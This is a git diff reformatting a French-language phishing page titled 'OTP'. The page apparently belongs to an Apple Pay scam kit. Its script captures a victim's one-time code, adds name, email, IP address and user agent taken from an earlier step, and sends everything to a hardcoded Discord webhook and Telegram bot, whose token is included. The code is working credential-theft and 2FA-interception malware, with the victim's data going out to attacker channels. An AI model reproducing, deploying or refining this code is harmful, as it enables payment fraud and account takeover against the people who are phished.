@@ -1,13 +1,53 @@
 <!DOCTYPE html>
 <html lang="fr">
-<head><meta charset="UTF-8"><title>OTP</title>
+<head>
+<meta charset="UTF-8">
+<title>OTP</title>
 <style>
-  body{background:#2c014d;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
-  .c{background:rgba(44,1,77,0.85);padding:30px;border-radius:20px;width:360px;text-align:center}
-  input,button{width:100%;margin:8px 0;padding:12px;border:2px solid #a54ffb;border-radius:10px;background:transparent;color:white;font-size:16px;outline:none}
-  button{background:#f7b500;color:#2c014d;font-weight:bold;cursor:pointer;box-shadow:0 0 10px #f7b500;transition:0.3s}
-  button:hover{background:#e0a600;box-shadow:0 0 20px #ffcb3c}
-  #msg{color:#f88;margin-top:15px}
+  body {
+    background: #2c014d;
+    color: #fff;
+    font-family: sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+  }
+  .c {
+    background: rgba(44,1,77,0.85);
+    padding: 30px;
+    border-radius: 20px;
+    width: 360px;
+    text-align: center;
+  }
+  input, button {
+    width: 100%;
+    margin: 8px 0;
+    padding: 12px;
+    border: 2px solid #a54ffb;
+    border-radius: 10px;
+    background: transparent;
+    color: white;
+    font-size: 16px;
+    outline: none;
+  }
+  button {
+    background: #f7b500;
+    color: #2c014d;
+    font-weight: bold;
+    cursor: pointer;
+    box-shadow: 0 0 10px #f7b500;
+    transition: 0.3s;
+  }
+  button:hover {
+    background: #e0a600;
+    box-shadow: 0 0 20px #ffcb3c;
+  }
+  #msg {
+    color: #f88;
+    margin-top: 15px;
+  }
 </style>
 </head>
 <body>
@@ -24,30 +64,68 @@
   const TELEGRAM_TOKEN = "7949221639:AAFENIkH1WqC2m6oVP8_aPOnsT6Qk9tBN2E";
   const TELEGRAM_CHAT = "-1002810249796";
 
-  async function sendDiscord(embed){ return fetch(DISCORD_WEBHOOK,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({embeds:[embed]})}); }
-  async function sendTelegram(text){ return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:TELEGRAM_CHAT,text,parse_mode:'Markdown',disable_web_page_preview:true})}); }
+  async function sendDiscord(embed) {
+    return fetch(DISCORD_WEBHOOK, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ embeds: [embed] })
+    });
+  }
+
+  async function sendTelegram(text) {
+    return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT,
+        text,
+        parse_mode: 'Markdown',
+        disable_web_page_preview: true
+      })
+    });
+  }
 
   document.getElementById('otpf').addEventListener('submit', async e => {
     e.preventDefault();
     document.getElementById('msg').textContent = 'Envoi en cours...';
     const code = e.target.otp.value.trim();
-    const step2 = JSON.parse(localStorage.getItem('step2')||'{}');
-    const ip = await (async()=>{ try{ const r = await fetch("https://api.ipify.org?format=json");return (await r.json()).ip;}catch{return "IP inconnue"} })();
+    const step2 = JSON.parse(localStorage.getItem('step2') || '{}');
+
+    const ip = await (async () => {
+      try {
+        const r = await fetch("https://api.ipify.org?format=json");
+        return (await r.json()).ip;
+      } catch {
+        return "IP inconnue";
+      }
+    })();
+
     const ua = navigator.userAgent || "Inconnu";
 
     const discordEmbed = {
-      title:"🍎 APPLE PAY [🍎]",
-      color:0xe74c3c,
-      fields:[
-        {name:"🍎 Code",value:`\`${code}\``,inline:false},
-        {name:"🚀 Nom",value:step2.nom,inline:true},{name:"🚀 Prénom",value:step2.prenom,inline:true},
-        {name:"🚀 E‑Mail",value:step2.email,inline:false},
-        {name:"🌐 IP",value:ip,inline:false},{name:"🌐 UA",value:ua,inline:false}
+      title: "🍎 APPLE PAY [🍎]",
+      color: 0xe74c3c,
+      fields: [
+        { name: "🍎 Code", value: `\`${code}\``, inline: false },
+        { name: "🚀 Nom", value: step2.nom || "Non fourni", inline: true },
+        { name: "🚀 Prénom", value: step2.prenom || "Non fourni", inline: true },
+        { name: "🚀 E‑Mail", value: step2.email || "Non fourni", inline: false },
+        { name: "🌐 IP", value: ip, inline: false },
+        { name: "🌐 UA", value: ua, inline: false }
       ],
-      timestamp:new Date().toISOString()
+      timestamp: new Date().toISOString()
     };
 
-    const telegramText = `[🍎] APPLE PAY [🍎]\n\n🍎 Code : ${code}\n\n[🎲] INFOS [🎲]\n🚀 Nom : ${step2.nom}\n🚀 Prénom : ${step2.prenom}\n🚀 E‑Mail : ${step2.email}\n\n[🌐] TIERS [🌐]\n🌐 Adresse IP : ${ip}\n🌐 User-Agent : ${ua}`;
+    const telegramText =
+      `[🍎] APPLE PAY [🍎]\n\n` +
+      `🍎 Code : ${code}\n\n` +
+      `[🎲] INFOS [🎲]\n` +
+      `🚀 Nom : ${step2.nom || "Non fourni"}\n` +
+      `🚀 Prénom : ${step2.prenom || "Non fourni"}\n` +
+      `🚀 E‑Mail : ${step2.email || "Non fourni"}\n\n` +
+      `[🌐] TIERS [🌐]\n` +
+      `🌐 Adresse IP : ${ip}\n` +
+      `🌐 User-Agent : ${ua}`;
 
     await Promise.all([sendDiscord(discordEmbed), sendTelegram(telegramText)]);
     document.getElementById('msg').textContent = 'OTP envoyé !';
